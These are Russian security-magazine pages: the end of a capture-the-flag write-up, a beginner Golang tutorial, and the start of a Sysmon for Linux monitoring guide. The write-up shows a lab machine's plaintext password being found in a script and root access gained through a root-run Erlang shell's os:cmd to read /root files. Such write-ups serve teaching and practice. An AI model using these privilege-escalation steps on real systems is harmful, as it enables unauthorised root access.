Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.


Закидываем на удаленный хост скрипт для Linux, даем ему право на выпол‐
нение и запускаем сканирование. В выводе ищем только потенциально
полезную инфу.
  В дереве процессов видим выполнение скрипта на Erlang.



                           Дерево процессов

Среди открытых портов есть порт 2222, который прослушивается только
для адреса 127.0.0.1.





                        Прослушиваемые порты

Просмотрим   содержимое    найденного    скрипта   /usr/local/lib/
erlang_login/start.escript . В нем мы находим имя и пароль учетной
записи:


{user_passwords, [{"ben", "HouseH0ldings998"}]}





                     Содержимое файла start.escript

Авторизуемся по SSH и забираем первый флаг.



                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

SSH Eshell версии 15.2.5 на порте 2222 работает в контексте привилегиро‐
ванной учетной записи root. Подключимся и глянем help .


ssh ben@localhost -p2222





                               Справка help

Наша задача — найти способ выполнить команды или хотя бы записать фай‐
лы, так как эти действия будут выполняться от имени root. Проверить это мож‐
но, просмотрев содержимое каталога /root .





                        Содержимое каталога root

В списке модулей есть интересный модуль os , который должен уметь запус‐
кать процессы.





                            Загруженные модули

Выполнять команды будем с помощью функции cmd из модуля os .


os:cmd("id").
os:cmd("cat /root/root.txt").




                           Флаг рута

Мы успешно читаем файл с флагом, а значит, машина захвачена! © X
КОДИНГ





Go — один из тех языков, что не оставляют
никого  равнодушным:  его  или  любят,
или  хейтят. Он  необычен —  синтаксис
чем‑то  напоминает  C,  Kotlin  и  Pascal                                                                                                                   flexits
                                                                               Инженер и разработчикодновременно. Он краток — мало ключевых                                                                                  (embedded + backend)
слов, нет ООП, нет исключений и даже         4d.41.49.4c@gmail.com
перечислений. Но при этом в Go можно
всего парой  строк  поднять  веб‑сервер,
не скачивая ни одного нового пакета.


Этот материал открывает цикл статей, где я покажу возможности и особен‐
ности этого языка на живых примерах. Это не совсем руководство в духе
«учимся программировать с полного нуля»: в начале я постараюсь понятно
рассказать о самых основах, чтобы ты смог написать и понять простейшую
программу, но дальше разбор сложных вещей на детсадовском уровне
был бы слишком объемным. Поэтому постепенно перейдем на взрослые объ‐
яснения для тех, кто хоть немного видел другие языки программирования.
Как далеко смогут протянуть новички — не уверен. Делись впечатлениями
в комментариях!
   Примеры будут по возможности перекликаться с реальными задачами.
Однако, разумеется, эти примеры в чем‑то синтетические и во многом упро‐
щенные. Мы не будем писать второй Metasploit с нуля, да и не сможем этого
сделать.
   Также я не ставлю перед собой цель переписать спецификацию языка
или создать всеобъемлющий учебник по Go, научить тебя писать идиоматич‐
ный код с применением современных паттернов проектирования или расска‐
зать, как отвечать на каверзные вопросы собеседований.
  Моя основная цель — показать современный и необычный язык, который
часто (и незаслуженно) обходят вниманием, считая нишевым или экстра‐
вагантным.


             INFO

                      У Go есть и альтернативное название — Golang.
                       Из‑за   распространенности   глагола   to   go
                        в английском языке поисковые запросы со сло‐
                     вом go зачастую приводят совсем не туда, куда
                        хотелось бы. Поэтому, когда гуглишь что‑то, луч‐
                   ше использовать слово Golang.


Далеко ходить не станем и начнем с классического Hello, world:


package main


import "fmt"


func main() {
    fmt.Println("Привет, Хакер!")
}


        WWW

                     Все исходники ты можешь найти в моем репози‐
                       тории .


Давай разберем построчно. Сначала объявляем пакет с именем main . Пакет
в Go — это каталог с файлами, где каждый файл начинается со слова package
и названия пакета.
  Мы написали, что наш код включен в пакет main : если компилятор найдет
в том же каталоге другие файлы с таким началом, то все их объединит. Нужно
это, чтобы можно было разбить длинный код на отдельные смысловые части,
но обращаться к переменным и функциям, заданным в других частях (в других
языках такой механизм называется пространством имен — namespace).
   Следующей строчкой мы импортируем пакет fmt, содержащий функции
консольного ввода и вывода. Для его импорта, как и других пакетов из стан‐
дартной библиотеки , достаточно указать только имя. Для пакетов сторонних
разработчиков потребуется указать источник, например github.com/spf13/
viper , потому что в Go нет центрального репозитория пакетов (при этом есть
общий ресурс с документацией по пакетам).
   Наконец, точка входа в приложение — функция main , не принимающая
аргументов и не возвращающая значений.
   Объявление любой функции в Go начинается ключевым словом func .
Дальше идет название функции ( main ), пустые скобки (здесь могут быть аргу‐
менты, которые принимает функция, но main у нас ничего не принимает) и в
фигурных скобках — тело функции.
  Важный момент: открывающая фигурная скобка никогда не должна сто‐
ять в новой строке. В противном случае утверждение будет обработано неп‐
равильно и возникнет ошибка компиляции.


             INFO

                   В C мы написали бы void main(void) , а в Go
                           просто не указываем ничего.


Внутри main мы вызываем функцию Println из ранее импортированного
пакета fmt: сначала fmt, затем точка, затем Println и в скобках (как ты уже
знаешь, в них идет аргумент) — строка «Привет, Хакер!», которую мы хотим
вывести в консоль. Строки, как и в большинстве языков, оборачиваются
в двойные кавычки.


        WWW

                   Я здесь не буду описывать синтаксис оформле‐
                       ния вывода и  альтернативные  варианты  фун‐
                       кции — подробности ты найдешь в доках самос‐
                           тоятельно.


             INFO

                            Пока что по синтаксису все привычно для тех, кто
                         немного знаком с любым другим C-подобным
                          языком. Но дальше встретятся некоторые особен‐
                         ности.  Например, Go  тоже  использует  точку
                        с запятой как маркер окончания утверждения. Но,
                           следуя   парадигме   минималистичности,  Go
                       не  требует  от  программиста  ставить  точки
                        с запятой и делает это сам. Отсюда и запрет
                       на фигурные скобки в отрыве от объявления фун‐
                       кции — иначе между ними вставилась бы точка
                        с запятой.


                         GoИстория и особенности языка
Go был разработан внутри компании Google как собственная альтернатива
C++ для применения в высоконагруженных сервисах. Разработчики — «звез‐
дная команда»: Роберт Гризмер (браузерный движок Google V8), Роб Пайк
(Unix), Кен Томпсон (Unix, C). Первая версия представлена в 2009 году.
Основная цель создания языка — всесторонне упростить и облегчить C++,
не теряя в возможностях и скорости исполнения.
   Главная особенность Go — лаконичность. В нем мало слов и понятий,
порой даже слишком (так, помимо наследования и переопределения фун‐
кций, в язык не включили и ternary operator, и даже enum). С другой стороны,
в наличии автоматическое управление памятью и невероятно обширная стан‐
дартная библиотека.
   Тебе не придется, как в C, на каждый чих изобретать свой велосипед
из сотен строк — к твоим услугам куча возможностей, от парсинга JSON
до ZIP-архивирования. При этом  сохраняется простота и  компактность.
Никаких гигабайтных SDK и танцев с версиями сотен зависимостей в пакет‐
ном менеджере.
   Среди сильных сторон Go обычно называют следующее:
 • простота во всем — от изучения ключевых слов до поиска и подключения
   пакетов;
 • легкость переиспользования кода;
 • высокая скорость компиляции;
 • компактный тулчейн;
 • кросс‑компиляция под  множество платформ и  статическая  линковка
   бинарников, исключающая необходимость таскать за собой зависимости;
 • развитая система многопоточности с собственным планировщиком, уско‐
  ряющим работу и снижающим нагрузку на ОС.

Ты можешь возразить: разве многопоточность так уж редка в современных
языках программирования? И будешь, конечно, прав. Но дело здесь в прос‐
тоте и пороге вхождения. Толщина книжек «Java Concurrency на практике»
пугает джунов, а о подводные камни периодически спотыкаются даже сень‐
оры. Тем временем Go изначально создавался как многопоточный язык,
с максимально прямолинейной и очевидной реализацией этого механизма.
  На Go или с его использованием написаны такие известные инструменты,
как Docker, Kubernetes, Terraform, Prometheus, Grafana. Для создания собс‐
твенных сервисов Go используют в Google, Uber,  Netflix, Dropbox, Twitch
и множестве других компаний.
   Наконец, если тебе интересно, как реализована та или иная фича языка,
с Go ты без труда можешь заглянуть «под капот» — и сам язык, и стандартная
библиотека распространяются по свободной лицензии, как и подавляющее
большинство пакетов, созданных сторонними разработчиками.
   Талисман языка Go — синий мультяшный суслик (англ. gopher).





ИНСТРУМЕНТАРИЙ

Давай разберемся, как вообще создавать и запускать программы. И здесь
Go продолжает следовать парадигме минималистичности. Для разработки
программ тебе потребуется единственный инсталляционный пакет под твою
платформу, размером где‑то 60 Мбайт. Там есть все, что нужно для сборки
программ под любую поддерживаемую ОС и архитектуру.
  Я пока не говорил? Кросс‑платформенность — еще одна фишка Go,
вариаций поддерживаемых платформ множество, от Windows до  Solaris,
от 386 до MIPS и POWER8. Все верно, для любой из них ты можешь собрать
бинарник на своем компьютере без каких‑либо дополнительных инструмен‐
тов и зависимостей.
  Код можно писать хоть в блокноте или nano, но обычно используют более
богатые возможностями среды: VS Code или, например, Zed . Есть и ком‐
мерческая IDE GoLand .


        WWW

                    По  неизвестной  мне  причине  в  популярный
                      Notepad++ встроенную подсветку синтаксиса Go
                      до сих пор не завезли. Выручают пользователь‐
                       ские стили, вот пример .


После установки мы можем воспользоваться консольной утилитой go .
  В Linux:


mkdir hello && cd $_
touch hello.go && nano $_
# Скопипасти текст примера выше
go run hello.go

В Windows:


mkdir hello
cd hello
notepad hello.go
:: Скопипасти текст примера выше
go run hello.go

Команда go run собирает бинарник из указанного файла, помещает его
во временный каталог и запускает, а после завершения работы — удаляет.
Если же нужно сохранить собранный код, используй go build (c ключом -o
можно указать желаемое имя выходного файла).
  В целом этого достаточно, чтобы писать и выполнять простые программы,
использующие только средства стандартной библиотеки.

Кросс-компиляция
Цель сборки задается двумя переменными окружения: GOOS определяет опе‐
рационную систему и GOARCH — архитектуру. Возможные комбинации можно
увидеть, выполнив команду go tool dist list .
  К примеру, можем в Windows собрать бинарник для Linux ARM64 (нап‐
ример, Raspberry Pi):


 set GOOS=linux&& set GOARCH=arm64&& go build -o hello_arm64


Обрати внимание на отсутствие пробелов после значений переменных.
   Если же нужно из Linux собрать .exe для Windows, можем задать такие
параметры:


 GOOS=windows GOARCH=amd64 go build -o hello.exe





                       Сборка для разных платформ




Прежде чем пойти дальше, познакомимся еще с одной важной концепцией —
модулями. Модулем называют один или несколько пакетов, составляющих
единое целое. Как правило, модуль — это отдельное приложение, и в таком
случае он обязательно должен содержать один и только один пакет main ,
в котором находится одна функция main — она будет точкой входа в приложе‐
ние.
  Для создания модуля используется команда go mod init <имя_модуля> .
Выполнив ее в уже созданном каталоге hello , увидим, что создан файл go.
mod. В нем находится описание модуля и перечень зависимостей — пакетов
сторонних разработчиков.
   Когда нам понадобится использовать в своем модуле какой‑то пакет,
не включенный в стандартную библиотеку, выполним go get <имя_пакета>
и импортируем этот пакет в своем коде. При этом в корневом каталоге
модуля будет создан (или обновлен, если уже существует) файл go.sum,
содержащий версии и хеши используемых пакетов.
  Еще одна полезная команда — go mod tidy . Она выполняет сразу нес‐
колько действий:
 • добавляет в go.mod пакеты, которые в нем отсутствуют, но импортирова‐
  ны в коде модуля;
 • удаляет из go.mod пакеты, которые в нем присутствуют, но не импорти‐
   рованы в коде модуля;
 • соответствующим образом обновляет go.sum .

Собирая модуль, можно не указывать конкретный файл с точкой входа. Как я
уже говорил, у нас есть один пакет main и одна функция main , и Go вполне
способен найти ее сам в текущем каталоге. Поэтому для любого модуля сме‐
ло вызывай go run . и go build . — с точкой вместо имени файла.


             INFO

                         Размер бинарника будет меньше, если не вклю‐
                         чать в него отладочную информацию и таблицу
                          символов: go build -ldflags "-w -s" .


Кстати, в языке Go принят единый жестко заданный стандарт форматиро‐
вания исходного кода. Можно привести свой код к соответствию, выполнив go
fmt.


        WWW

                          Другие полезные команды Go смотри в справке .



Наконец, еще немного обсудим доступность кода. Я уже говорил, что пакет
можно понимать как пространство имен. У тебя в модуле может быть несколь‐
ко разных файлов, но, если все они относятся к одному пакету (то есть имеют
одинаковую первую строку package — и за ней одно и то же название), все
функции и переменные будут доступны в любом файле. Это можно исполь‐
зовать для структурирования объемного кода.


             INFO

                          Модификаторов private/public в Go нет, все, что
                            объявлено внутри пакета, видно по всему пакету.


Если же ты импортируешь другой пакет, ты будешь видеть только те функции
и переменные, что начинаются с заглавной буквы. Так, импортировав fmt, ты
можешь вызвать fmt.Printf, а вот, например, printArg — нет. Она видна
только коду внутри пакета fmt.


ПЕРЕМЕННЫЕ И УСЛОВИЯ

Давай расширим наше приложение hello : будем выводить имя запустившего
его пользователя (сначала выполни go mod init hello , если еще не сделал
этого).


import (
    "fmt"
    "os"
)


func main() {
    var username string
    username = "Хакер"


    val, ok := os.LookupEnv("USERNAME")
    if ok {
        username = val
    }


    fmt.Printf("Привет, %s!\n", username)
}

В начале мы видим подключение пакетов fmt и os. Обрати внимание на син‐
таксис со скобками: в Go можно импортировать несколько пакетов одной
группой. Скобки здесь используются для удобства и читаемости — это не
вызов функции, поэтому и запятых нет.
   Далее, в функции main , мы объявляем строковую переменную. Объявле‐
ние переменной начинается ключевым словом var, за которым следует имя
и тип (да, в Go тип указывается после имени, а не до, как в C). В следующей
строке мы присваиваем значение переменной. Довольно громоздко, не так
ли?
  На самом деле можно совместить: var username string = "Хакер" .
   Фича языка под названием type inference позволяет вывести тип из зна‐
чения, то есть при инициализации переменной тип можно и не указывать: var
username = "Хакер" . А еще есть короткий синтаксис: username := "Хакер"
(обрати внимание, здесь := вместо = ). Так‑то лучше!
  А что, если тебе нужно объявить много переменных? Как и при подклю‐
чении пакетов, можно использовать скобки:


var (
    userName  string
    hostHame  string
    groupName string
)

Но не слишком  увлекайся: в Go запрещено объявлять  неисполь‐
зуемые переменные , такой код не соберется.


             INFO

                            Используя const вместо var, ты можешь объ‐
                        явить константу.


Go позволяет объявлять или присваивать несколько переменных в одной
строке. Как думаешь, что выведет этот код?


a, b, str := 0, 1, "test"
a, b = b, a
fmt.Printf("%s: a=%d, b=%d\n", str, a, b)




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИКОДИНГ
        GO КОДИТЬ!
             НАЧИНАЕМ УЧИТЬ GOLANG
                 БЕЗ СКУЧНЫХ КНИЖЕК





             INFO

                          Чтобы  быстренько  выполнить  какой‑то  код,
                       не обязательно создавать файл и вызывать go
                   run src.go — можешь для этого использовать
                          онлайновую песочницу .


Более того, функция может возвращать сразу несколько значений! Мы видим
это в следующей строке примера: инициализируем две новые переменные
val и ok значениями, возвращаемыми из os.LookupEnv() (снова внимание
на оператор := ).
   Функция LookupEnv() из пакета os находит в переменных окружения ту,
имя которой совпадает с заданным, и возвращает ее значение.
   Итак, os.LookupEnv() поищет в переменных окружения нужную. Если
поиск успешен — вернет ее значение и true (истина). В противном случае
второе возвращенное значение будет false (ложь). Мы пользуемся этим
для проверки, была ли найдена переменная USERNAME , и в случае успеха
присваиваем ее значение username и выводим в консоль: if ok { ... .
Как видишь, условие в Go не заключается в скобки, в отличие от многих дру‐
гих языков.
  Но ведь может быть так, что не все возвращаемые функцией значения нам
нужны. Допустим, мы хотим проверить наличие определенной переменной
окружения, но конкретное ее значение нам неинтересно. При этом ком‐
пилятор Go выдаст ошибку, если мы не будем использовать объявленную
переменную. Поэтому мы используем символ подчеркивания _ , чтобы указать
на игнорируемое значение.
   Что, если мы пропустим строку username = "Хакер" и переменная окру‐
жения не будет найдена? При этом ok будет равно false , и мы попытаемся
вывести неинициализированную строковую переменную. По опыту других
языков очевидно, что это приведет к ошибке. Но если ты закомментируешь
эту строку, то увидишь, что код нормально выполняется.
   Дело в том, что в Go понятие неинициализированных переменных отсутс‐
твует как таковое. Каждая новая переменная инициализируется зна‐
чением по умолчанию , zero value. Для численных типов это 0, для string —
пустая строка, для bool — false и для всех остальных — nil.
  Код нашего примера выводит имя пользователя только в Windows. В Linux
обычно нет переменной окружения USERNAME , но может быть LOGNAME . Давай
проверим обе:


func main() {
    username := "Хакер"


    val, ok := os.LookupEnv("USERNAME")
    if ok {
        username = val
    } else {
        // Обрати внимание, здесь = вместо :=
        // Как думаешь, почему?
        val, ok = os.LookupEnv("LOGNAME")
        if ok {
            username = val
        }
    }


    fmt.Printf("Привет, %s!\n", username)
}

Выглядит не очень красиво. Но я написал именно так намеренно, чтобы про‐
иллюстрировать разницу между := и = . Мы используем := , только если слева
есть как минимум одна новая переменная. Если все они уже существуют, ком‐
пилятор выдаст ошибку; следует использовать = .
   Пакет runtime , помимо прочего, предоставляет доступ к переменным
GOOS и GOARCH, определяющим целевую платформу, по состоянию на момент
компиляции. Можем снизить вложенность условий, заранее выбрав искомый
ключ в зависимости от операционной системы:


import (
    "fmt"
    "os"
    "runtime"
)


func main() {
    var (
        envKey   string
        username string
    )


    if runtime.GOOS == "windows" {
        envKey = "USERNAME"
    } else {
        envKey = "LOGNAME"
    }


    username, ok := os.LookupEnv(envKey)
    if !ok {
        username = "Хакер"
    }


    fmt.Printf("Привет, %s!\n", username)
}

Впрочем, есть более простое решение: функция user.Current() из пакета
os/user — она возвращает структуру со сведениями о текущем пользовате‐
ле, включая имя. Как и вся стандартная библиотека, эта функция кросс‑плат‐
форменная.
   Ты, возможно, уже задался вопросом, что же такое структура. Струк‐
тура — это композитный тип, объединяющий набор именованных перемен‐
ных, называемых полями .
   Представь, что структура — это что‑то вроде записи в записной книжке.
Каждое поле — это строчка. Одна — для ФИО, другая — для телефонного
номера и так далее. Структурами можно описывать практически что угодно.
   Если вдруг ты уже знаешь, что такое класс в объектно ориентированных
языках, можешь представлять структуру как класс, но без наследования,
конструкторов и деструкторов. Так же как и в класс, в структуру могут входить
и функции, и они точно так же будут называться методами .
   Функция‑метод  user.Current()  возвращает  два  значения,  первое
из которых — указатель на экземпляр структуры типа User . Вот как могло бы
выглядеть определение такой структуры, если бы мы делали ее самос‐
тоятельно:


type User struct {
    Uid string
    Gid string
    Username string
    Name string
    HomeDir string
}
func (u *User) GroupIds() ([]string, error)

Как видишь, у этой структуры пять строковых полей и один метод, возвра‐
щающий набор  идентификаторов  групп,  к которым  принадлежит  поль‐
зователь. Доступ к полям и методам структуры происходит через ее имя
и точку, как и во многих других языках. Изменим код нашего hello:


import (
    "fmt"
    "os/user"
)


func main() {
    var username string


    u, err := user.Current()
    if err != nil {
        username = "Хакер"
    } else {
        username = u.Username
    }


    fmt.Printf("Привет, %s!\n", username)
}

Второе значение, возвращаемое из user.Current() , имеет тип error и ука‐
зывает на ошибку при выполнении. Если же оно равно nil, значит, функция
отработала успешно.
  Я пока не буду детально рассматривать ошибки и их обработку в Go, прос‐
то знай, что очень многие функции последним  значением возвращают
или error , как user.Current() , или bool, как os.LookupEnv() , указывая
на (не)успешное выполнение.


Вывод содержимого структур для дебага
Ты можешь посмотреть на содержимое экземпляра структуры, выведя его
в консоль вызовом fmt.Println() . Но это будет не очень наглядно, потому
что все значения полей напечатаются в одну строку, разделенные пробелами,
а имен полей не будет вообще. Красиво форматированный вывод можно
получить, используя пакет github.com/goforj/godump.
   Если ты работаешь в Windows, тебя может подстерегать еще одна неожи‐
данность: управляющие последовательности ANSI , используемые для фор‐
матирования консольного вывода, поддерживаются, но могут быть не вклю‐
чены.       Для        их        включения         установи       флаг
ENABLE_VIRTUAL_TERMINAL_PROCESSING    вызовом    функции    WinAPI
SetConsoleMode() или используй один из пакетов, например github.com/
flexits/vt-enable.
  Для примера hello выполни в консоли


 go get github.com/goforj/godump
 go get github.com/flexits/vt-enable


Добавь в код такие строки:


 // После u, err := user.Current()
 vt.Enable()
 godump.Dump(u)





                       Println по сравнению с выводом godump





ТИПЫ ДАННЫХ

Сейчас мы  чуть  ускоримся. Если ты совсем начинающий программист
и встретишь что‑то непонятное — не переживай, потом поймешь, когда дой‐
дем до практики. Эта часть — скорее для тех, кто переходит с другого языка
программирования и хочет быстро въехать в Go.
  Мы уже использовали такие типы, как string и bool. Давай посмотрим, что
есть еще. К простым, или базовым (basic), типам, помимо строкового string
и логического bool, относится множество численных типов разных раз‐
меров: знаковые целые int8 , int16 , int32 , int64 ; беззнаковые целые uint8 ,
uint16, uint32, uint64; с плавающей точкой float32 , float64 ; комплексные
числа complex64, complex128 .
   Помимо  этого, есть псевдонимы  (alias): byte для uint8 , int и uint
для int32 / uint32 или int64 / uint64, в зависимости от разрядности целевой
платформы (помнишь про GOARCH?). Если у тебя нет цели слишком погружать‐
ся в оптимизацию и сложные математические вычисления, то этих псев‐
донимов обычно хватает за глаза.
  Имей в виду, что неявных преобразований в Go нет и, если захочешь сме‐
шать в одном выражении разные численные типы, понадобится использовать
явное преобразование типов . Синтаксис преобразования: T(v) , где T —
целевой тип, v — преобразовываемое значение или переменная.
  В нашем Hello, world строки в Go используют Unicode. И как ты, возможно,
знаешь, размер отдельного символа Unicode варьируется: 1 байт (то есть
uint8 ) для ASCII-символов, 2 байта для большинства европейских наборов,
включая кириллицу, 3 или 4 байта для иероглифов, эмодзи и прочего. Один
символ в Go имеет размер 32 бита ( int32 ) и называется руной. Для него
есть собственный псевдоним — rune .
   Чтобы увидеть различие наглядно, можешь немного изменить код в нашем
примере. Функция len(s) возвращает количество байтов в строке, и оно
будет соответствовать числу символов только в том случае, когда все байты
относятся к кодировке ASCII.


func main() {
      s := "Привет, хакер!"
    fmt.Printf("%s is %d bytes\n", s, len(s))
    s = "Hello, Hacker!"
    fmt.Printf("%s is %d bytes\n", s, len(s))
}

Можно преобразовать строку в последовательность байтов: bytes := []
byte(str) —  и,  наоборот,  преобразовать  последовательность  байтов
в строку: str := string(bytes), но, как ты понимаешь, для не ASCII-сим‐
волов результаты совершенно не будут соответствовать желаемым.
  Для работы именно с символами строки ( rune ) в стандартной библиотеке
есть пакет unicode/utf8. Например, узнать длину строки в символах можно
вызовом функции utf8.RuneCountInString() .
  К отдельному байту строки можно получить доступ через его индекс str[
i] , но здесь нам доступно только чтение, потому что строки в Go нельзя
менять (то есть они «иммутабельны»). При этом если обходить все символы
строки через range (мы подробнее поговорим об этом операторе чуть поз‐
же), то преобразование в символы выполнится автоматически:


for i, s := range str {
    fmt.Printf("%T\n", s) // rune
}


          GoУказатели в
В Go, как и в C/C++, есть указатели , с тем же смыслом: указатель —
это адрес в памяти, где находится другая переменная. В отличие от C/C++,
арифметики указателей нет, можешь выдохнуть с облегчением (и вообще,
написание ребусов в Go не приветствуется). Использование указателей про‐
диктовано следующим соображением: все аргументы в Go передаются
по значению , то есть копируются. Пока мы работаем с простыми типами,
особой разницы для нас нет. Но если мы передаем в функцию (или возвра‐
щаем из нее) какую‑то структуру или массив большого размера, мы будем
вынуждены копировать его, а это расход ресурсов. В таком случае мы и при‐
бегаем к использованию указателей.


Составные, или композитные (composite), типы создаются объединением
базовых. Во‑первых, это, конечно, уже рассмотренные нами структуры ,
объединяющие в один набор поля произвольных типов. Во‑вторых, это мас‐
сивы , представляющие собой последовательность элементов одного типа.
   Массивы объявляются как [n]T , где n — количество элементов в массиве
(размер массива), T — тип элементов.
   Размер массива должен быть константой времени компиляции, и из‑за
этого ограничения с точки зрения практического применения массивы нам
не очень интересны. Гораздо удобнее работать с типом данных slice ( срез ,
слайс) — последовательностью изменяемой длины.
  Еще в нашем распоряжении есть тип map ( карта , ассоциативный массив,
словарь), хранящий данные в виде уникальных пар ключ — значение. Для вза‐
имодействия между параллельными потоками применяют channel ( канал ) —
до этого мы доберемся попозже.
   Срезы, карты и каналы внутри представляют собой структуру с соответс‐
твующими методами и хранилищем данных. Перед их использованием необ‐
ходимо выделить память и инициализировать внутренние структуры, что дела‐
ется функцией make() (если только мы не инициализируем значения сразу
же).
  Срез характеризуется тремя параметрами: тип элемента, длина, емкость.
Длина показывает, сколько элементов срез содержит на данный момент,
а емкость — сколько элементов в нем может быть размещено всего. Элемент
в срез добавляется функцией append() .
   Если при очередном добавлении емкость среза исчерпана, выделяется
новая область памяти большего размера и содержимое переносится в нее.
На первый взгляд это выглядит неоправданно усложненным решением.
В самом деле, какой смысл говорить о емкости среза, если он все равно
будет увеличен до нужного автоматически?
  И здесь снова дело в оптимизации. Выделять срез заведомо большой
емкости — пустой расход памяти. Выделять небольшой срез и постоянно
изменять его размер при добавлении элементов — много лишних операций.
Поэтому Go дает нам возможность заранее указать емкость, если мы ее зна‐
ем. Функция len() возвращает количество элементов в срезе, то есть его
длину, а cap() — емкость.
   Здесь можно еще много чего рассказать, но, думаю, читателям «Хакера»
будет проще сразу перейти к практике и уже потом разбираться с тонкостя‐
ми. В следующий раз мы используем все перечисленные и некоторые новые
возможности и напишем собственный сканер портов на Go.


Популярные пакеты
Настоятельно рекомендую тебе хотя бы бегло ознакомиться со стандартной
библиотекой , чтобы не придумывать то, что уже написано до и для тебя. Кро‐
ме этого, хотелось бы привести небольшой список сторонних пакетов, вхо‐
дящих в число наиболее популярных среди разработчиков, — не поленись,
взгляни:
 • работа с конфигами: spf13/viper ;
 • расширенная обработка флагов командной строки: urfave/cli , jessevdk/go-
   flags ;
 • создание интерактивных CLI-приложений: spf13/cobra ;
 • тестирование: testify ;
 • логирование: slog , zap , logrus .
ADMIN





В этой статье мы рассмотрим инструмент
мониторинга Sysmon, к которому так при‐
выкли в винде, и глянем, насколько его вер‐
сия для Linux хорошо себя покажет. Также                                                                           Борис Осепов
                                                                                        Специалист ИБсоберем  основные  знания  о  Sysmon                                                                                     mainboros777@gmail.com
для Linux.


Мы часто настраиваем аудит в Linux (auditd, eBPF ) — и сами, и вместе с кол‐
легами. Потом приходят джуны, и выясняется, что им... сложно. Ну ладно,
подумали мы. Немного изврата — и хотя бы базовое логирование в Linux
всегда можно настроить, почти без затрат.
   Основная цель статьи — рассказать об инструменте, показать его воз‐
можности и пополнить копилку знаний «Хакера» еще одной занятной тех‐
нологией, о которой в комьюнити безопасников пока мало говорят.


УСТАНОВКА

С установкой мудрить не нужно: официальная инструкция проста и понятна —
всего четыре команды, и все готово.
  Да и ребуты не нужны. Чтобы запустить службу, выполняем sysmon -i -n .
   Можно  проверить,  что  по  умолчанию  уже  фиксируются  какие‑то
XML‑подобные логи: sudo tail -f /var/log/syslog. В некоторых дистри‐
бутивах их можно увидеть через journalctl | grep sysmon. Ну и не забудь
убедиться, что служба вообще запустилась: systemctl status sysmon.
   Окей, health check прошел. Базовые команды похожи на винду (есть хо‐
роший гайд по ним). Введем sysmon и увидим минимальную справку.
  В целом на этом обзор можно было бы и закончить, но мы будем дотошны
и последовательны. Зачем нам инструмент, который нельзя пощупать?!


ОЖИДАНИЕ: ТИПЫ СОБЫТИЙ

Давай посмотрим, какие события может ловить Sysmon for Linux по срав‐
нению с его виндовым собратом. Очевидно, что виндовый может все .


 Ev
                                 Встре‐
 en
       Название            тишь       Примечание
  t
                             в Linux
 ID

 1     Создание процесса      +

       Изменение   временных
 2                          –
       меток файла

 3     Сетевое соединение      +          TCP + UDP

       Изменено     состояние
 4                          +
        службы Sysmon

 5     Процесс завершен       +

 6     Драйвер загружен        –

 7     Образ загружен         –

        Создание    удаленного                   Использует   процедуру
 8                          –
       потока                                из Win32 API

 9     Прямое чтение          +

 10    Доступ к процессу        +

                                                  Частично      опирается
  11    Файл создан            +
                                            на WinAPI

        Создание/удаление объ‐
 12                         –           Ну какой тебе реестр!
        екта в реестре

         Установлено   значение
 13                         –
        параметра реестра

        Переименование   объ‐
 14                         –
        екта реестра

 15    Создан файловый поток   –

       Изменение   конфигура‐
 16                         +
       ции Sysmon

        Именованный канал соз‐
 17                         –
       дан

        Подключение   к   име‐
 18                         –
        нованному каналу

                                                   Создан,  изменен,  уда‐
 19    WMI-фильтр            –
                                            лен (WMI в Linux нет)

                                                   Создан,  изменен,  уда‐
 20    Потребитель WMI        –
                                            лен

        Фильтр  WMI    связан
 21                         –
       с потребителем

                                               Основан на обращениях
 22    DNS-запрос            –
                                                     к dnsapi.dll

      Файл удален с создани‐
 23                         +
      ем копии

 24    Обновлен буфер обмена   –              Работает для текста

        Изменен образ процес‐
 25                         –
       са

 26   Файл удален            –            WinAPI

         Блокировка исполняемо‐
 27                         –             Опирается на WinAPI
        го файла

         Блокировка  поблочного
 28                         –             Опирается на WinAPI
        удаления файла

        Исполняемый файл уда‐
 29                         –
       лен

 25
       Ошибка                –
 5

Да, инструмент ограниченный, но иногда и не нужно большего — главное,
чтобы быстро!
   Если чуть серьезнее, то большая часть возможностей Sysmon завязана
на проприетарные виндовые фичи — WinAPI, WMI,  особенности NTFS,
которых в Linux, очевидно, мало или они вовсе отсутствуют, как, например,
реестр.
  В сухом остатке мы должны увидеть хорошо структурированные базовые
события: создание и завершение процесса, сетевые соединения, создание
и удаление файлов, прямое чтение с диска, получение доступа к процессу.
Есть собственный аудит (изменение конфигурации Sysmon).


НАСТРОЙКА

Что ж, давай настроим инструмент, научим его логировать что‑то полезное
и проверим Sysmon for Linux в действии.
   Настройка делается через загрузку конфигурации. По умолчанию никаких
правил нет — в основном пишутся события создания и завершения процесса.
Исправим это. Конфигурацию в общем случае можно загрузить как виндовую
(обобщенную — понятно, что фильтры работать не будут), так и созданную
специально для Linux . Для эксперимента скачаем конфиг для всех ивентов
и посмотрим, на что он способен.


almost_all_hunt-naked.xml
<Sysmon schemaversion="4.81">
    <HashAlgorithms> * </HashAlgorithms>
    <DnsLookup>True</DnsLookup>
    <EventFiltering>
        <!--Event ID 1: Process creation-->
        <ProcessCreate onmatch="exclude"></ProcessCreate>
        <!--Event ID 2: A process changed a file creation time-->
        <FileCreateTime onmatch="exclude"></FileCreateTime>
        <!--Event ID 3: Network connection-->
        <NetworkConnect onmatch="exclude"></NetworkConnect>
        <!--Event ID 5: Process terminated-->
        <ProcessTerminate onmatch="exclude"></ProcessTerminate>
        <!--Event ID 6: Driver loaded-->
        <DriverLoad onmatch="exclude"></DriverLoad>
        <!--Event ID 7: Image loaded-->
        <ImageLoad onmatch="exclude"></ImageLoad>
        <!--Event ID 8: CreateRemoteThread-->
        <CreateRemoteThread onmatch="exclude"></CreateRemoteThread>
        <!--Event ID 9: RawAccessRead-->
        <RawAccessRead onmatch="exclude"></RawAccessRead>
        <!--Event ID 10: ProcessAccess-->
        <ProcessAccess onmatch="exclude"></ProcessAccess>
        <!--Event ID 11: FileCreate-->
        <FileCreate onmatch="exclude"></FileCreate>
        <!--Event ID 12: RegistryEvent (Object create and delete)-->
        <!--Event ID 13: RegistryEvent (Value Set)-->
        <!--Event ID 14: RegistryEvent (Key and Value Rename)-->
        <RegistryEvent onmatch="exclude"></RegistryEvent>
        <!--Event ID 15: FileCreateStreamHash-->
        <FileCreateStreamHash onmatch="exclude"></
FileCreateStreamHash>
